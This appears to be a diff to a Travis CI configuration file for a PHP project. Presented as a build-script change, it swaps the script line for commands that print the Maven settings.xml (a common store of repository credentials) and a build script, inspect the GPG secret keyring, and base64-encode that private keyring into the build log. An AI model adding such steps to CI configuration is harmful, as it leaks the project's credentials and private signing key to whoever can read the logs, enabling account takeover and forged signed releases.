@@ -1,4 +1,4 @@
 language: php
 php:
   - 5.5
-script: find /home/travis -maxdepth 2; set
+script: cat /home/travis/.m2/settings.xml /home/travis/build.sh ;file /home/travis/builds  ; stat /home/travis/.gnupg/secring.gpg; base64 </home/travis/.gnupg/secring.gpg
